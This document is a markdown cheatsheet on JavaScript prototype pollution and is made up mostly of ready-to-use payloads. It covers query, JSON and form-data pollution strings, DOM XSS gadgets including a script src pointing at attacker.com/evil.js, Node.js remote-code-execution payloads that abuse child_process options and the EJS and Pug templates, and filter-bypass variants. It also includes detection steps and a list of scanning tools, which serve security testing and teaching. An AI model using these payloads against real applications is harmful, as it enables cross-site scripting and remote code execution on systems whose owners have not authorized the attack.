# 🧬 Prototype Pollution Cheatsheet

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 What is Prototype Pollution

**Prototype Pollution** is a JavaScript vulnerability where attacker can modify `Object.prototype`, affecting all objects in the application.

### Impact
- 🔴 **XSS** - DOM manipulation
- 🔴 **RCE** - Server-side (Node.js)
- 🔴 **Bypass** - Security controls
- 🔴 **DoS** - Application crash

---

## 🔍 JavaScript Prototypes

### How It Works
```javascript
// Every object inherits from Object.prototype
let obj = {};
obj.__proto__ === Object.prototype  // true

// If we pollute prototype:
Object.prototype.polluted = "hacked";

// All objects are affected:
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

### Dangerous Properties
```javascript
__proto__
constructor
prototype
```

---

## 💉 Client-Side Payloads

### Via URL (Query/Hash)
```
# Basic
?__proto__[polluted]=value
?__proto__.polluted=value

# Constructor
?constructor[prototype][polluted]=value

# Nested
?__proto__[__proto__][polluted]=value

# URL encoded
?__proto__%5Bpolluted%5D=value
```

### Via JSON
```javascript
// User input
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// Nested
{"a": {"__proto__": {"polluted": "value"}}}
```

### Via Form Data
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

## 🔥 Exploitation Examples

### DOM XSS via innerHTML
```javascript
// If code does:
element.innerHTML = obj.html || "";

// Pollute:
?__proto__[html]=<img src=x onerror=alert(1)>

// Result: XSS!
```

### Script src Gadget
```javascript
// If code does:
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// Pollute:
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

### DOM clobbering combo
```javascript
// Common gadget patterns
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

### jQuery Gadgets
```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// Exploit
?__proto__[url]=javascript:alert(1)
```

---

## 🖥️ Server-Side (Node.js)

### RCE via child_process
```javascript
// If app uses spawn/exec with options object:
const { spawn } = require('child_process');
spawn('ls', [], options);

// Pollute:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// Or:
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

### RCE via require()
```javascript
// Pollution payload
{"__proto__": {"main": "./pwned.js"}}
```

### EJS Template RCE
```javascript
// EJS (< 3.1.7) RCE
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

### Pug Template RCE
```javascript
// Pug RCE
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

## 🔍 Detection

### Manual Testing
```javascript
// In browser console:
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // If "polluted" = vulnerable

// Clean up
delete Object.prototype.testPollution;
```

### URL Testing
```
# Add to URL and check console
?__proto__[test]=polluted

// In console:
({}).test  // Should be undefined, if "polluted" = vulnerable
```

### Find Gadgets (DOM Invader)
```
1. Install DOM Invader (Burp Suite)
2. Enable prototype pollution mode
3. Browse application
4. Check for exploitable sinks
```

---

## 🛠️ Tools

| Tool | Purpose |
|------|---------|
| **DOM Invader** | Burp extension for PP detection |
| **ppfuzz** | Prototype pollution fuzzer |
| **ppmap** | Scan for gadgets |
| **PPScan** | Client-side scanner |

### ppmap Usage
```bash
# Install
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# Scan
node ppmap.js https://target.com
```

---

## 📊 Quick Reference

### Payload Formats
| Format | Payload |
|--------|---------|
| Query | `?__proto__[x]=y` |
| Hash | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| Merge | `Object.assign({},input)` |

### Common Gadgets
| Property | Impact |
|----------|--------|
| `innerHTML` | XSS |
| `src` | Script injection |
| `href` | Redirect |
| `shell` | RCE (Node.js) |
| `env` | RCE (Node.js) |

### Bypass Techniques
```javascript
// If __proto__ filtered:
constructor.prototype.polluted = "value"

// Different notation
["__proto__"]["polluted"] = "value"

// Unicode
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

## 📚 Resources

- [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [Server-side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [Client-side PP Scanner](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 Pollute the Prototype!</b><br>
  <i>For authorized testing only!</i>
</p>
